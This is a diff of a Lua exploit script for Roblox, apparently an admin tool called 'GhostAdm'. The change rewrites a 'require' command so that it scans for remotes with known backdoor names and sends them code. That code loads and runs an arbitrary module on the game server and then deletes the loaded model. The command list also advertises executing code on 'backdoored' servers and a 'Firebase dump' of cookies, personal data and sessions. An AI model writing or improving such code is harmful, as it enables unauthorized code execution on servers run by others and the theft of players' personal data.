@@ -4638,7 +4638,7 @@ CMDs[#CMDs + 1] = {NAME = 'hexexplorer', DESC = 'Loads Hex Explorer'}
 CMDs[#CMDs + 1] = {NAME = 'bootloader', DESC = 'Loads Bootloader'}
 CMDs[#CMDs + 1] = {NAME = 'cookielog / clog [url|test|auto|stop|deep|personal|roster|history|dump|raw|queue|view|debug]', DESC = 'Full Firebase dump: cookie, personal data, profiles, roster, sessions, places'}
 CMDs[#CMDs + 1] = {NAME = 'firebaseurl / fburl [url]', DESC = 'Shortcut to set the Firebase Realtime DB URL'}
-CMDs[#CMDs + 1] = {NAME = 'require [assetid]', DESC = 'Executes require scripts'}
+CMDs[#CMDs + 1] = {NAME = 'require /runmodule / modulescript [assetid]', DESC = 'Executes require scripts'}
 CMDs[#CMDs + 1] = {NAME = 'ss / serverexec [code]', DESC = 'Executes any code into backdoored server'}
 CMDs[#CMDs + 1] = {NAME = 'sssky / ssskybox [assetid]', DESC = 'Changes skybox on servers side'}
 CMDs[#CMDs + 1] = {NAME = 'ssdecal / sspaint [assetid]', DESC = 'Changes decal on servers side'}
@@ -14226,61 +14226,82 @@ addcmd('firebaseurl', {'fburl', 'fburi', 'fbdb'}, function(args, speaker)
 	notify('Firebase', 'Saved:\n' .. u, 6)
 end)
 
-addcmd("require", {}, function(args, speaker)
-    -- Isolation
-    local rawInput = args[1]
-    if not rawInput then
-        return getgenv().execCmd("notify [GhostAdm] Missing asset ID argument!")
+addcmd('require', {'runmodule', 'modulescript'}, function(args, speaker)
+    -- Utilizing the native script string parser to collect the asset parameter block
+    local rawInput = getstring(1, args)
+    if not rawInput or rawInput == "" then
+        return notify("Require", "Missing Asset ID! Usage: " .. prefix .. "ssrequire [ID]")
     end
 
-    -- Next
+    -- Strip formatting artifacts or prefixes to keep clean numeric entries
     local cleanedInput = tostring(rawInput):gsub("%D", "")
     local assetId = tonumber(cleanedInput)
     
     if not assetId then
-        return getgenv().execCmd("notify [GhostAdm] Invalid Asset ID! Must be a numeric string.")
+        return notify("Require", "Invalid Asset ID! Value must be a valid numeric string.")
     end
 
-    getgenv().execCmd("notify [GhostAdm] Scanning environment for open backdoor nodes...")
+    notify("Require", "Assembling server deployment package for ID: " .. assetId)
 
-    -- Encodes a string to load the ModuleScript on the server host
-    local targetServerCode = string.format("require(%d)('%s')", assetId, speaker.Name)
-    local nodeFound = false
-
-    -- Automated Multi-Remote scanner and exploit matrix
-    local potentialRemotes = {
-        {Path = game:GetService("ReplicatedStorage"), Name = "Handshake", Args = function(code) return code end},
-        {Path = game:GetService("ReplicatedStorage"), Name = "RemoteEvent", Args = function(code) return code end},
-        {Path = game:GetService("ReplicatedStorage"), Name = "Execute", Args = function(code) return code end},
-        {Path = game:GetService("ReplicatedStorage"), Name = "vibe", Args = function(code) return "run", code end},
-        {Path = game:GetService("ReplicatedStorage"), Name = "MainRemote", Args = function(code) return code end},
-        {Path = game:GetService("JointsService"), Name = "JointsEvent", Args = function(code) return code end},
-        {Path = game:GetService("ReplicatedStorage"), Name = "ExecuteCode"},
-        {Path = game:GetService("ReplicatedStorage"), Name = "ExecuteEvent"},
-        {Path = game:GetService("ReplicatedStorage"), Name = "GetScript"},
-    }
-
-    -- Process communication across the boundary
-    for _, node in ipairs(potentialRemotes) do
-        if node.Path then
-            local targetRemote = node.Path:FindFirstChild(node.Name)
-            if targetRemote and (targetRemote:IsA("RemoteEvent") or targetRemote:IsA("RemoteFunction")) then
-                nodeFound = true
-                task.spawn(function()
-                    if targetRemote:IsA("RemoteEvent") then
-                        targetRemote:FireServer(node.Args(targetServerCode))
-                    elseif targetRemote:IsA("RemoteFunction") then
-                        targetRemote:InvokeServer(node.Args(targetServerCode))
+    local targetServerCode = string.format([[
+        task.spawn(function()
+            local assetId = %d
+            local speakerName = "%s"
+            
+            -- sjsjsj
+            local success, model = pcall(function()
+                return game:GetService("InsertService"):LoadAsset(assetId)
+            end)
+            
+            if success and model then
+                local module = model:FindFirstChildWhichIsA("ModuleScript") or model:GetDescendants()
+                if module and module:IsA("ModuleScript") then
+                    local ran, err = pcall(function()
+                        local moduleFunc = require(module)
+                        if type(moduleFunc) == "function" then
+                            moduleFunc(speakerName)
+                        end
+                    end)
+                end
+                model:Destroy() -- Erase instance
+            else
+                -- Fallback baseline context
+                pcall(function()
+                    local genericModule = require(assetId)
+                    if type(genericModule) == "function" then
+                        genericModule(speakerName)
                     end
                 end)
-                getgenv().execCmd(string.format("notify [GhostAdm] Dispatched payload through node: %s", node.Name))
             end
+        end)
+    ]], assetId, speaker.Name)
+
+    -- Deep infrastructure layout table array
+    local targetNames = {
+        "Handshake", "RemoteEvent", "Execute", "vibe", 
+        "MainRemote", "JointsEvent", "ExecuteCode", "ExecuteEvent", "GetScript"
+    }
+
+    local payloadDispatched = false
+    
+    -- Traverse the network boundary using recursive descendant enumeration loops
+    for _, obj in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
+        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and table.find(targetNames, obj.Name) then
+            payloadDispatched = true
+            task.spawn(function()
+                if obj:IsA("RemoteEvent") then
+                    obj:FireServer(targetServerCode)
+                elseif obj:IsA("RemoteFunction") then
+                    obj:InvokeServer(targetServerCode)
+                end
+            end)
         end
     end
 
-    if not nodeFound then
-        getgenv().execCmd("notify [GhostAdm] Failure: No accessible remote gateways detected.")
-        print("[GhostAdm Debug] Active game instance does not possess common public backdoors.")
+    if payloadDispatched then
+        notify("Require", "Successfully dispatched server-require chain allocation through target nodes.")
+    else
+        notify("Require", "Network routing failed: Unmapped communication channels.")
     end
 end)
 
